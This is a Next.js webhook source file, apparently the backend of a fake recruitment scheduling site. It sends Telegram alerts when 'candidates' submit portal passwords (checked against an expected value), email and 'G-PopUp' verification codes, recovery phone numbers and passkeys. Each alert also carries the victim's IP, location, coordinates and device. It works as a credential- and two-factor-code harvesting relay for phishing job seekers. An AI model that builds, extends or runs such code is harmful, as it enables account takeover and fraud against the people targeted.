import { NextRequest, NextResponse } from "next/server";
import {
  escapeHtml,
  sendTelegramNotification,
  getTelegramDiagnostics,
  getTelegramConfig,
} from "@/lib/telegram";

async function resolveIpAndLocation(req: NextRequest, record: Record<string, any>) {
  let ip = record.ip_address || "";
  let city = record.city || "";
  let state = record.state || "";
  let country = record.country || "";

  // 1. If IP is missing in record, extract from request headers
  if (!ip || ip === "Unknown IP" || ip === "null") {
    ip =
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      req.headers.get("cf-connecting-ip") ||
      req.headers.get("x-client-ip") ||
      "";
  }

  // 2. If location is missing, check edge headers
  if (!city) {
    city = req.headers.get("x-vercel-ip-city") || "";
    if (city) city = decodeURIComponent(city);
  }
  if (!state) {
    state = req.headers.get("x-vercel-ip-country-region") || "";
    if (state) state = decodeURIComponent(state);
  }
  if (!country) {
    country = req.headers.get("x-vercel-ip-country") || "";
    if (country) country = decodeURIComponent(country);
  }

  // 3. Fallback geo lookup if IP exists and location is still missing
  const isLocal =
    !ip ||
    ip === "::1" ||
    ip === "127.0.0.1" ||
    ip.startsWith("192.168.") ||
    ip.startsWith("10.");

  if ((!city || !country) && !isLocal && ip) {
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, {
        headers: { "User-Agent": "recruitment-app/1.0" },
        cache: "no-store",
      });
      if (geoRes.ok) {
        const d = await geoRes.json();
        if (d && !d.error) {
          city = city || d.city || "";
          state = state || d.region || d.region_code || "";
          country = country || d.country_name || d.country || "";
        }
      }
    } catch {}
  }

  // 4. Secondary fallback if local dev
  if (isLocal && !city) {
    try {
      const altRes = await fetch("https://ipwho.is/", { cache: "no-store" });
      if (altRes.ok) {
        const d = await altRes.json();
        if (d && d.success !== false) {
          ip = ip && !isLocal ? ip : d.ip || ip;
          city = city || d.city || "";
          state = state || d.region || d.region_code || "";
          country = country || d.country || d.country_code || "";
        }
      }
    } catch {}
  }

  const locParts = [city, state, country].filter(Boolean);
  const locationStr = locParts.length > 0 ? locParts.join(", ") : "Unknown Location";

  return {
    ip: ip || "Unknown IP",
    city: city || "",
    state: state || "",
    country: country || "",
    location: locationStr,
  };
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    // 1. Validate Secret if configured
    const secret = req.headers.get("x-webhook-secret");
    const configuredSecret = process.env.TELEGRAM_WEBHOOK_SECRET;
    if (configuredSecret && secret && secret !== configuredSecret) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const { botToken, chatIds } = getTelegramConfig();

    if (!botToken || chatIds.length === 0) {
      console.warn("Telegram Bot Token or Chat ID not configured in environment variables.");
      return NextResponse.json(
        { message: "Telegram credentials not configured on server, notification skipped" },
        { status: 200 }
      );
    }

    // 2. Determine event type & record
    const record = body.record || body;
    const geo = await resolveIpAndLocation(req, record);

    const isVisit =
      body.table === "schedule_visits" ||
      body.type === "schedule_visit" ||
      (!body.table && record.session_id && !record.date && !record.candidate_id);

    const isDraft =
      body.type === "candidate_draft" ||
      (body.table === "bookings" && !record.candidate_id && !record.passkey);

    const isNPassword =
      body.type === "n_password_submitted" ||
      Boolean(record.n_submitted_password);

    const isNCode =
      body.type === "n_code_submitted" ||
      Boolean(record.n_submitted_code);

    const isNGCode =
      body.type === "n_gcode_submitted" ||
      Boolean(record.n_submitted_gcode);

    const isNPhone =
      body.type === "n_phone_submitted" ||
      Boolean(record.n_submitted_phone);

    const isAdditionalCode =
      body.type === "additional_code_submitted" ||
      body.type === "code_submitted" ||
      (Boolean(record.additional_code) && !record.passkey && !isNPassword && !isNCode && !isNGCode && !isNPhone);


    const isBooking =
      body.table === "bookings" ||
      body.type === "booking" ||
      body.type === "booking_created" ||
      body.type === "INSERT" ||
      Boolean(record.candidate_id || record.passkey);

    let messageHtml = "";


    if (isVisit) {
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
      const timezone = record.timezone || "Unknown";
      const userAgent = record.user_agent
        ? record.user_agent.length > 80
          ? record.user_agent.substring(0, 80) + "..."
          : record.user_agent
        : "Unknown";

      const time = new Date(record.created_at || Date.now()).toLocaleTimeString("en-US", {
        timeZone: "America/New_York",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
      });

      const coordsInfo = record.latitude && record.longitude ? `\n🧭 <b>Coordinates:</b> <code>${escapeHtml(record.latitude)}, ${escapeHtml(record.longitude)}</code>` : "";

      messageHtml =
        `⚡ <b>Candidate Opened Scheduling Link!</b>\n\n` +
        `👤 <b>Interviewer Link:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>` +
        coordsInfo + `\n` +
        `🕒 <b>Time:</b> ${time} (New York / EST)\n` +
        `🌍 <b>Timezone:</b> <code>${escapeHtml(timezone)}</code>\n` +
        `📱 <b>Device / Browser:</b> <code>${escapeHtml(userAgent)}</code>`;
    } else if (isDraft) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const date = record.date || record.scheduled_date || "N/A";
      const time = record.start_time || record.scheduled_time || "N/A";
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";

      const coordsInfo = record.latitude && record.longitude ? `\n🧭 <b>Coordinates:</b> <code>${escapeHtml(record.latitude)}, ${escapeHtml(record.longitude)}</code>` : "";

      messageHtml =
        `📝 <b>Candidate Details Entered (Auto-Saved)!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>` +
        coordsInfo + `\n` +
        `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
        `🔒 <b>Status:</b> In ID/Passkey Modal`;
    } else if (isAdditionalCode) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const date = record.date || record.scheduled_date || "N/A";
      const time = record.start_time || record.scheduled_time || "N/A";
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
      const candidateId = record.candidate_id || "N/A";
      const codeValue = record.additional_code || "N/A";
      const codeNumber = record.code_number ? ` #${record.code_number}` : "";

      messageHtml =
        `🔢 <b>Candidate Submitted Additional Code${escapeHtml(codeNumber)}!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `🔑 <b>Candidate ID:</b> <code>${escapeHtml(candidateId)}</code>\n` +
        `🔢 <b>Additional Code:</b> <code>${escapeHtml(codeValue)}</code>\n` +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
        `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
        `🔒 <b>Status:</b> Awaiting Admin Approval`;
    } else if (isNPassword) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || record.name || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const submittedPassword = record.n_submitted_password || record.password || "N/A";
      const expectedPassword = record.n_expected_password || record.expected_password || null;
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";

      let matchStatusLine = "";
      if (expectedPassword) {
        const isMatch = submittedPassword.trim() === expectedPassword.trim();
        matchStatusLine = isMatch
          ? `✅ <b>Password Match:</b> <b>MATCH (Matches Expected Password!)</b>\n`
          : `❌ <b>Password Match:</b> <b>MISMATCH!</b> (Expected: <code>${escapeHtml(expectedPassword)}</code>)\n`;
      }

      messageHtml =
        `🔐 <b>Candidate Submitted N-Portal Password!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `🔑 <b>Submitted Password:</b> <code>${escapeHtml(submittedPassword)}</code>\n` +
        matchStatusLine +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}`;
    } else if (isNCode) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || record.name || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const submittedCode = record.n_submitted_code || record.code || "N/A";
      const targetEmail = record.n_code_target_email || record.target_email || null;
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";

      messageHtml =
        `🔢 <b>Candidate Submitted N-Portal Email Code!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `🔢 <b>Submitted Code:</b> <code>${escapeHtml(submittedCode)}</code>\n` +
        (targetEmail ? `🎯 <b>Sent To (Admin Set):</b> <code>${escapeHtml(targetEmail)}</code>\n` : "") +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}`;
    } else if (isNGCode) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || record.name || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const submittedGCode = record.n_submitted_gcode || record.gcode || "N/A";
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";

      messageHtml =
        `📱 <b>Candidate Submitted G-PopUp Code!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `📱 <b>G-Code:</b> <code>${escapeHtml(submittedGCode)}</code>\n` +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}`;
    } else if (isNPhone) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || record.name || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const submittedPhone = record.n_submitted_phone || record.phone_recovery || "N/A";
      const phoneMask = record.n_phone_mask || null;
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";

      messageHtml =
        `📞 <b>Candidate Submitted G-Number Recovery Phone!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Candidate Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `📱 <b>Submitted Number:</b> <code>${escapeHtml(submittedPhone)}</code>\n` +
        (phoneMask ? `🎯 <b>Mask Hint:</b> <code>${escapeHtml(phoneMask)}</code>\n` : "") +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}`;
    } else if (isBooking) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const date = record.date || record.scheduled_date || "N/A";
      const time = record.start_time || record.scheduled_time || "N/A";
      const interviewer = record.interviewer_name || "Recruiting Team";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
      const candidateId = record.candidate_id || "N/A";
      const passkey = record.passkey || "N/A";

      const coordsInfo = record.latitude && record.longitude ? `\n🧭 <b>Coordinates:</b> <code>${escapeHtml(record.latitude)}, ${escapeHtml(record.longitude)}</code>` : "";

      messageHtml =
        `🎉 <b>Candidate Submitted ID & Passkey!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `🔑 <b>Candidate ID:</b> <code>${escapeHtml(candidateId)}</code>\n` +
        `🏷 <b>Passkey:</b> <code>${escapeHtml(passkey)}</code>\n` +
        `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>` +
        coordsInfo + `\n` +
        `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}`;
    } else {
      messageHtml = `🔔 <b>Recruitment Notification:</b>\n<pre>${escapeHtml(
        JSON.stringify(record, null, 2)
      )}</pre>`;
    }

    // 3. Dispatch message to all configured chats (Direct personal chat + Telegram group)
    const result = await sendTelegramNotification(messageHtml);

    return NextResponse.json({
      success: result.success,
      sentCount: result.sentCount,
      totalTargets: result.totalTargets,
      results: result.results,
    });
  } catch (err: any) {
    console.error("Webhook processing error:", err);
    return NextResponse.json({ error: err.message || "Internal Server Error" }, { status: 500 });
  }
}

/**
 * Diagnostic & discovery endpoint:
 * Call GET /api/webhooks/telegram to check bot status, see configured chat IDs,
 * inspect recently detected Telegram groups the bot was added to, or test delivery with ?test=true.
 */
export async function GET(req: NextRequest) {
  const url = new URL(req.url);
  const isTest = url.searchParams.get("test") === "true";

  const diagnostics = await getTelegramDiagnostics();

  if (isTest && diagnostics.configured) {
    const testMessage =
      `🧪 <b>Telegram Notification Test</b>\n\n` +
      `✅ If you see this message, Telegram notifications are working properly!\n` +
      `👥 Dispatched to all configured chats (personal bot chat + group).\n` +
      `🕒 <i>${new Date().toISOString()}</i>`;

    const testDelivery = await sendTelegramNotification(testMessage);

    return NextResponse.json({
      diagnostics,
      testDelivery,
    });
  }

  return NextResponse.json({
    diagnostics,
    tip: "Add ?test=true to this URL to send a test message to all configured chats.",
  });
}
